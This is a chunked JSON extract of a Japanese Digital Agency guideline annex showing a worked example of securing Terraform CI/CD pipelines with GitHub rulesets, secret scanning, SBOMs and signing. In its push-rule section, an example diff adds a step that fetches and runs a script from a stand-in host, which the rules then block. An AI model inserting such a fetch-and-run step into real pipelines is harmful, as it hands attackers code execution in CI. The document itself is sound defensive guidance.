{"shard_id":"デジタル社会推進標準ガイドライン_2025-06_0","group":"デジタル社会推進標準ガイドライン_2025-06","chunk_count":32,"chunks":[{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c0","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"デジタル社会推進実践ガイドブック DS-202 CI/CD パイプラインにおけるセキュリティの留意点 に関する技術レポート – 別添. CI/CD パイプラインによるInfrastructure as Code 実装例 2025（令和7）年6 月13 日 デジタル庁 〔ドキュメントの位置付け〕 Informative 参考とするドキュメント 〔キーワード〕 CI/CD パイプライン、IaC、モダンアプリケーション、アジャイル、クラウ ドネイティブ、DevOps、DevSecOps、変更管理、構成管理 〔概要〕 本ドキュメントは「CI/CD パイプラインにおけるセキュリティの留意点に 関する技術レポート」の理解を促進するにあたって、具体的なシナリオをも とに各要素について実例を示す。\n\n改定履歴 改定年月日 改定箇所 改定内容 2025年6月13日 - ・初版決定\n\n目次 目次 ................................................................ 1 １ はじめに ................................","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":1,"page_to":3,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c1","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":".................................. 7 1) 利用者やエンドポイントにおける対策 ........................... 7 2) ソースコード管理システム、そのリポジトリ及びブランチの保護 ... 7 ３.３ ビルドフェーズの保護 ....................................... 15 1) シークレット情報の漏洩対策 .................................. 15 2) ソースコード・成果物の信頼性の担保 .......................... 17 3) ビルド上での実行範囲の制限 .................................. 24 4) 依存物の安全性の担保 ........................................ 24 5) ストレージ内の成果物の保護 .................................. 25 ３.４ デリバリフェーズの保護 .........................","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":3,"page_to":3,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c2","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":".. 28 ４.３ ビルドフェーズの保護 ....................................... 29 1) シークレット情報の漏洩対策 .................................. 29 2) ソースコード・成果物の信頼性の担保 .......................... 29 3) ビルド上での実行範囲の制限 .................................. 32\n\n4) 依存物の安全性の担保 ........................................ 34 5) ストレージ内の成果物の保護 .................................. 36 ４.４ デリバリフェーズの保護 ..................................... 36 1) デリバリ時に利用する主体の保護 .............................. 36 2) 信頼できる成果物をデリバリするための保護 .................... 36 3) ","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":3,"page_to":5,"char_count":1244},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c3","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"rovider（以下「プロバイダー」 ）は宣言的な構成ファイルと状態ファイルを 入力値としてリソースを構成管理する。したがって、Terraform バイナリやプ ロバイダーは高リスクの第三者提供のソフトウェアと言えるであろう。そのた め、ソフトウェア・サプライチェーンの観点から、Terraform バイナリやプロ バイダー自体の信頼性はもとより、その取得（調達）手続きにも高い信頼性が 求められる。 また、世界中で豊富な導入実績を持ち、且つAWS 以外のクラウドプラットフ ォームにも活用できるTerraform が、複数のサービスを運営する組織（以下、 サービスチーム）に導入される蓋然性は高い。そのため、先述した信頼性を確 保するにあたって、一定の標準やルールが必要になると考えられる。そういっ た標準やルールの準拠を組織全体で効率的に実現するにあたって、それを職務 の一部とする「プラットフォームチーム」が存在すると仮定する（図 1） 。\n\n2 図 1：体制図 プラットフォームチームはそのCI/CD パイプライン内で、Terraform バイナ リおよびプロバイダーを公式の配布元から取得し","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":5,"page_to":7,"char_count":1220},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c4","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"イン GitHub Actions 、 AWS CodeBuild Gitlab, CircleCI, Terraform Cloud Infrastructure as Code Terraform (v1.10.2) Plumi,OpenTofu Terraform バイナリ及び プロバイダーのパッケー ジング Docker 1 GitHub クラウド版はTeam Plan である必要がある。本書は技術レポートを理解しやすくするための補助文書であり、 実際のCI／CD パイプラインの保護策を検討する場合には適切なGit リポジトリホスティングを対象にする必要がある。\n\n4 シークレットスキャン Trivy (v0.57.1) trufflehog 脆弱性スキャン/誤設定ス キャン 同上 checkov メタデータ生成 - Software Bill of Material（SBOM） 同上 Anchore, Docker 成果物署名、署名検証 Cosign (v2.4.1) メタデータ生成 - Provenance2 同上 他 AWS の各種サービス 図 3 は、上記ツールを用いた","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":7,"page_to":9,"char_count":1292},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c5","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"ナリおよびAWS プロバイダーを、サービ スチームに提供できる状態にする。これは、複数チームで共通利用されるソ フトウェアに対する個別のセキュリティチェックをプラットフォームチーム が担うことで、ルールへの準拠がより実行的になる効果を期待している。具 体的には、公式配布元からTerraform バイナリおよびAWS プロバイダーを取得 し、それらをパッケージングしたコンテナイメージを成果物とする。ここで は、公式の配布元及びそれへの経路については信頼できると仮定する。コン テナ化する理由は、異なる実行環境やローカル環境を持つ各情報システムに 対して、一貫性のある動作を保証しやすいからである。 ビルドされたコンテナイメージに対しては、シークレットのスキャンや脆 弱性のスキャンを実施し安全性を確認する。また、成果物であるコンテナイ メージの利用者であるサービスチームがその信頼性を検証し判断できるよう、 SBOM やビルド環境に関するProvenance といったメタデータも生成する。また、 これらコンテナイメージ、SBOM、Provenance は完全性や真正性を検証できる よう署名を行っ","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":9,"page_to":10,"char_count":1230},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c6","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"る、 成果物の構成内容、脆弱性情報、来歴情報といったメタデータを提供する必 要がある（図 5） 。具体的な対応策については、３.３4)「依存物の安全性の 担保」で解説する。 図 5：CI/CD パイプラインの成果物が他方では依存物となりうる 2)シークレットの保護 ソースコードやビルド環境のあるGitHub と、その成果物を保管するAWS 間 の連携は、AWS のWeb API を介して行われる。パイプラインA では、長期間有 効なAWS IAM アクセスキーを、GitHub Actions がリクエストに含むことで実 現する形態を取る。AWS IAM アクセスキー自体の発行や更新方法は本書のスコ ープではない。しかし、アクセスキーをCI/CD パイプラインが利用できる形で 安全に保管する方法は重要である。特に、GitHub の変更履歴に残さず使いや すい形にするため、本書ではGitHub リポジトリの「Secrets」という機能に保 存するとことする。 また、アクセスキーの安全な利用方法については、３.２2)「ソースコー\n\n7 ド管理システム、そのリポジトリ及びブランチの保護」及び３","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":10,"page_to":12,"char_count":1300},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c7","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"策 ではないが、ブランチやその配下のリソースのアクセス権限にも影響する。 ここでは、Organization には、プラットフォームチーム以外が全くアクセス 権限をもたないこととする。リポジトリの設定では、プラットフォームチー\n\n8 ムのメンバーには基本「Write」権限を付与するが、ブランチ自体の管理を できるよう一部メンバーに「Admin」あるいは「Maintainer」等の権限を付 与する。リポジトリ内のリソースに対するアクセス権限の設定は次に述べる。 図 7: GitHub リポジトリの権限設定  強制的な取り込みの禁止 リポジトリの権限設定では、どのメンバーでも任意に変更を取り込める。 これはGitHub の仕様である。これはCI/CD パイプラインにおける品質管理や 変更管理の観点で問題になるため、変更のレビューや承認などを必須とし、 またそれらを実行できる範囲を限定的にする必要がある。これらの制限は GitHub Pro で利用可能な、 「Rulesets」機能で実現できる。具体的には、 「branch rulesets」を作成し、 「Targets」に「main」を、","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":11,"page_to":14,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c8","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"(curl -s https://bad.io/bash)\n\n10 % git commit -m “example modification” % git push -f origin main （中略） remote: error: GH013: Repository rule violations found for refs/heads/main. remote: Review all repository rules at https://github.com/xxx/mock-prv- guardrail/rules?ref=refs%2Fheads%2Fmain remote: remote: - Changes must be made through a pull request. remote: remote: remote: (?) To push, resolve push protection violations or follow this URL to request push protection bypass. remote: https://git","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":13,"page_to":15,"char_count":1205},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c9","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"github 配下のフ ァイルへの変更をPush できる主体を限定しなければならない。これには、 「Rulesets」機能の「Push rulesets」を使うことで実現可能である（図 10） 。 図 10: GitHub リポジトリのpush rule\n\n11 この設定をした状態で、CI/CD パイプライン関連の構成ファイルに変更を試 みても図 11 のように、ルールによってエラーと処理される。 % git diff diff --git a/.github/workflows/build.yml b/.github/workflows/build.yml index 35d3ea9..eaa68cc 100644 --- a/.github/workflows/build.yml +++ b/.github/workflows/build.yml @@ -88,6 +88,7 @@ jobs: - name: Set IMAGE_DIGEST id: set-image-digest run: | + bash <(curl -s https://bad.io/bash) echo","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":14,"page_to":15,"char_count":1199},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c10","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"he following violations before pushing again remote: remote: - File path is restricted remote: Found 1 violation: remote: remote: .github/workflows/build.yml remote: remote: (?) To push, resolve push protection violations or follow this URL to request push protec tion bypass. remote: https://github.com/xxxx/mock-prv-guardrail/exemptions/new/xxx= remote: To https://github.com/xxx/mock-prv-guardrail.git ! [remote rejected] develop -> develop (push declined due to repository rule violations) error:","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":15,"page_to":16,"char_count":1230},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c11","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"にするため、GitHub organization は全メンバーに 対して2FA を強制するだけでなく、さらに強度の高い2FA を指定することが 可能である（図 14） 。もし、GitHub のプランがEnterprise の場合は、自組 織のIdP（Identity Provider）との連携によるSSO（シングルサインオン） を設定し、すべてのメンバーに対してその利用を義務付けることもできる。 図 14: GitHub Organization の管理者が強制できる２要素認証と強度 5 https://docs.github.com/en/authentication/securing-your-account-with-two-factor-authentication- 2fa/about-mandatory-two-factor-authentication\n\n13  作業内容と作業者の紐づき 図 15: 作業内容と作業者の紐づき ここでの「作業者」は、実在の物理的な主体（人物）ではなく、GitHub アカ ウントを指す。GitHubアカウントは、リポジトリへの変更履歴を示","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":16,"page_to":18,"char_count":1294},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c12","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"。したがって、commit 作成前に機密情報を含もうとしていな いかをチェックする仕組みが重要となる。一例として、Git におけるフック （Git Hooks）のうちpre-commit フックを活用し、commit 直前にシークレッ トスキャンを実行する方法が考えられる。本書では、pre-commit（ツール） とTrivy を採用し、シークレットが含まれていないかを自動的に事前確認し ている。 （図 19） 。 % cat config/trivy-secrets-scan.yaml secret: # empty #config: ./config/secrets.yaml scan: scanners: - secret format: \"table\" exit-code: 1 % cat config/.pre-commit-config.yaml repos: - repo: local hooks: - id: trivy name: trivy language: golang entry: trivy fs --config ./config/trivy-secret","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":18,"page_to":19,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c13","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"xit code: 1 hoge.txt (secrets) Total: 1 (UNKNOWN: 0, LOW: 0, MEDIUM: 0, HIGH: 0, CRITICAL: 1) CRITICAL: AWS (aws-access-key-id) ════════════════════════════════════════ AWS Access Key ID ──────────────────────────────────────── hoge.txt:1 ──────────────────────────────────────── 1 [ export SAMPLE_AWS_KEY=******************** 2 ──────────────────────────────────────── 図 20：Git フックとTrivy によるシークレット検知 ３.３ビルドフェーズの保護 1)シークレット情報の漏洩対策 図 21：シークレット情報の漏洩対策 本パイプラインでは、成果物のアップロードや、成果物等への署名にAWS の アクセスキーを必要としてい","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":19,"page_to":21,"char_count":1277},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c14","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"エラーとして通知される。ただ し、既にpush 済みであるため、当該リポジトリの他アカウントが閲覧してい ることを想定し、安全のために該当キーを速やかにローテーションする必要 がある。 図 23：シークレット混入によるビルドフェーズの失敗と通知\n\n17 次に、ログへの出力である。マスキングが一般的な対策であり、本書で活 用するGitHub リポジトリ設定の「Secrets」はこの対策を備えている。GitHub Actions 上のワークフローが何らかの理由によりアクセスキーを含めるログ出 力を実装してしまった場合、GitHub Actions が自動的に出力されたシークレ ットの内容を除外する 6。なお、長期的に有効なシークレットの利用には変わ らないため、有効期限が短い動的に生成する構成を使うことが本来は望まし い7。また、GitHub のログ以外の成果物に書き込んだ場合には、マスキング対 象としては認識されない。これらのことから、そもそもアクセスキーを含む ようなログ出力の実装をしないことを基本とすべきである。 図 24：GitHub リポジトリの「Secrets」設定 2)ソース","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":20,"page_to":22,"char_count":1220},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c15","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"ては、品質管理の強化のため、３.２2)「強 制的な取り込みの禁止」に加え、特定のメンバーによる承認を強制する。具 体的にはCode Owners 8（図 26）を指定し、 「branch rule」に「Require review from Code Owners」にチェックを入れることでCode Owners のレビュ ーを必須化している（図 27） 。また、承認人数を指定することも可能である。 % cat .github/CODEOWNERS * @xxxxx 図 26：code owner の指定 図 27：branch rule における承認関連の設定 2「構成ミスの検出」と3「脆弱性の検出」は、Trivy によるスキャンを活用 8 https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing- your-repository/about-code-owners\n\n19 する（図 28） 。なお、構成ミスのスキャン対象はコンテナイメージを生成","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":22,"page_to":23,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c16","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"uns-on: ubuntu-24.04 steps: - name: Checkout repository uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364 - name: Check Misconfiguration uses: aquasecurity/trivy-action@18f2510ee396bbf400402947 with: scan-type: config scanners: dockerfile format: table scan-ref: ./ severity: MEDIUM,HIGH,CRITICAL exit-code: 1 output: misconfig-result.txt （中略） 図 28：Trivy による構成ミスの検出 スキャンの出力結果を 図 29 および図 30 に示している。構成ミスは Critical, High, Middle の範囲では検出されなかったが、Terraform バイナ リにはCritical およびHigh とされた脆弱性が各1 件ずつ検出され","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":23,"page_to":25,"char_count":1168},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c17","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"直ちに受けるとは言い切れないが、パイプライ ンA の成果物は複数のサービスチームが共通して利用する。そのため、プラッ トフォームチームはサプライヤーとして、サービスチームが安全に成果物を取 得できることに加え、最終的な利用可否を判断できるよう、該当脆弱性に関す る情報提供をすることが望ましい場合もある。そこで成果物のコンテナイメー ジへの署名に加え、成果物に関するメタデータ 11も作成・提供する。具体的に は、ソフトウェア・コンポジション解析（SCA）の一部であるSBOM ファイル、 および成果物の来歴（いつ・どこで・どのように生成されたか）を示す provenance ファイルを作成し、これらにも署名を行った上でアーティファクト リポジトリへアップロードする。 まずは、コンテナイメージを生成する。 % cat .github/workflows/build.yml jobs: build-and-deliver: runs-on: ubuntu-latest env: PREDICATE_FILE: predicate.json steps: (中略) - name: Configu","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":25,"page_to":25,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c18","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"ntext: . push: true build-args: | TF_VERSION=${{ env.DEFAULT_TF_VERSION }} UBUNTU_VERSION=${{ env.DEFAULT_UBUNTU_VERSION }} tags: ${{ steps.login-ecr.outputs.registry }}/tf- image:ubuntu.${{ env.DEFAULT_UBUNTU_VERSION }}- tf.${{ env.DEFAULT_TF_VERSION }},${{ steps.login-ecr.outputs.registry }}/tf- image:${{ env.DEFAULT_TF_VERSION }},${{ steps.login-ecr.outputs.registry }}/tf- image:latest labels: ${{ steps.meta.outputs.labels }} platforms: linux/arm64 provenance: false no-cache: ${{ inputs.no-ca","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":25,"page_to":26,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c19","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"ップロードされたコンテナイメージ 生成したコンテナイメージのSBOM ファイルとProvenance ファイル をそれ ぞれ、Trivy とSLSA Framework のツールで生成している。 % cat .github/workflows/build.yml jobs: build-and-deliver: runs-on: ubuntu-latest env: PREDICATE_FILE: predicate.json steps: (中略) - name: Generate a SBOM run: | trivy image --scanners vuln --format spdx-json -o ./tmp/tf-sbom.spdx.json ${{ steps.set-image-digest.outputs.IMAGE_DIGEST }} trivy image --scanners vuln --format cyclonedx -o ./tmp/tf-sbom.cdx.json ${{ steps.set-image-digest.outputs.IMAGE_DI","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":26,"page_to":27,"char_count":1274},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c20","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"st-sbom-artifacts/ cat ${{ env.PREDICATE_FILE }} | jq . 図 33：ビルド設定内で構成されたPredicate（SLSA、Provenance）の生成 そして、cosign というツールを利用し、コンテナイメージそのもの、メタ データ（SBOM ファイル、Provenance ファイル）に対して署名し、ECR にアッ\n\n23 プロードしている。 % cat .github/workflows/build.yml jobs: build-and-deliver: runs-on: ubuntu-latest env: PREDICATE_FILE: predicate.json steps: (中略) - name: Configure AWS Credentials uses: aws-actions/configure-aws- credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 with: aws-access-key-id: ${{ secrets.AWS_ACCESS_K","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":26,"page_to":27,"char_count":1200},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c21","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"y }}/tf- image@${{ steps.docker-build-and-push.outputs.digest }}\" echo \"Attest and Upload Provenance (SLSA)\" cosign attest --predicate=\"${{ env.PREDICATE_FILE }}\" $IMAGE_DIGEST \\ --yes \\ --tlog-upload=false \\ --type slsaprovenance \\ --key \"awskms:///${{ env.AWS_CMK_ID }}\" echo \"Attest and Upload SBOM\" cosign attest --predicate=\"./tmp/tf-sbom.cdx.json\" $IMAGE_DIGEST \\ --yes \\ --tlog-upload=false \\ --type cyclonedx \\ --key \"awskms:///${{ env.AWS_CMK_ID }}\" cosign attest --predicate=\"./tmp/tf-sbom.","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":27,"page_to":29,"char_count":1205},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c22","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"なっている。これら２つの対策によ り、不正なツールの混入リスクを緩和できる。加えて、ビルドフェーズは、 実稼働環境の変更に影響はない。そのため、権限という観点からも実行範囲 の制限を課すことができる。 4)依存物の安全性の担保 図 37：依存物の安全性の担保 依存物の安全性の担保としては、依存物のソフトウェア資産としての管理、\n\n25 脆弱性管理、そして依存物の完全性・真正性等の確認が考えられる。依存物の ソフトウェア資産としての管理および脆弱性の可視化は、３.３2)「ソースコ ード・成果物の信頼性の担保」にて行い、依存物の完全性・真正性については、 ３.３3)「ビルド上での実行範囲の制限」で言及した。 GitHub Actions 内で使用する外部モジュールアクション（action）も依存 物となる。これについても完全性と真正性を確保する必要がある。例えば図 38 に示す「actions/checkout」は、リポジトリ内の作業ツリーを切り替える 外部アクションであり、その「@v4」はリリースタグ（Git タグ）を示す。し かし、タグの指し示す先は変更される可能性があり、不変とは限ら","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":28,"page_to":30,"char_count":1224},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c23","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"review となった。 https://github.com/features/preview/immutable-actions 13依存物バージョン管理ツールであるDependabot はcommit hash からもバージョンを照合することができる\n\n26 ECR のリソースポリシーやKMS のキーポリシーの設定となるが、これらは CI/CD パイプライン特有の事項ではないため、省略する。 ３.４デリバリフェーズの保護 図 40：デリバリフェーズの保護 1)デリバリ時に利用する主体の保護 ３.３1)「シークレット情報の漏洩対策」等で触れているため、ここでは省 略する。 2)信頼できる成果物をデリバリするための保護 プラットフォームチームのチーム構成および少人数規模であることから、 本パイプラインではビルドとデリバリを同一の流れとした。そのため、保護 策は３.３「ビルドフェーズの保護」と同一となる。 3)デリバリ時の証跡 デリバリの証跡は、成果物としてはECR 上だけでなく、ソースコードのZip ファイルとしてGitHub 上に保管される。作業ログとしてはGitHub Actio","meeting":"デジタル社会推進標準ガイドライン","agency":"デジタル庁","title":"別添. CI/CDパイプラインによるInfrastructure as Code実装例（PDF／4,825KB）","date":"2025-06-30","url":"https://www.digital.go.jp/assets/contents/node/basic_page/field_ref_resources/e2a06143-ed29-4f1d-9c31-0f06fca67afc/2aa40167/20250630_resources_standard_guidelines_technical_report_02.pdf","page_from":29,"page_to":32,"char_count":1286},{"chunk_id":"59fd4957d4756fe2870e7aa1be2c0060_c24","doc_id":"59fd4957d4756fe2870e7aa1be2c0060","text":"インで扱うリソースに加え、依 存物であるプラットフォームチームの成果物も運用保守の対象とする必要が ある。具体的な対応策については、４.３4)「 依存物の安全性の担保」で解 説する。\n\n28 図 42：資産管理、脆弱性管理を含む・運用保守 2)シークレットの保護 パイプラインB では管理者が意識すべきシークレットはない。この仕組みに ついては、４.３3)「ビルド上での実行範囲の制限」にて解説する。 3)CI/CD パイプラインを通した信頼性の確保 単純化のため、パイプラインB でもサービスチームの管理者がソースコード からデリバリまでを管理する。そのため、各パイプラインのフェーズでチー ムの差が発生せず、ある程度の信頼性がチーム構成によって担保される。 ４.２ローカル開発フェーズの保護 図 43：ローカル開発フェーズの保護 ブランチの運用に差はあるが、基本的にはパイプラインA と類似する設定に なるため、省略する。\n\n29 ４.３ビルドフェーズの保護 1)シークレット情報の漏洩対策 パイプラインB 特有の事項はないため、省略する。 2)ソースコード・成果物の信頼性の担保 図 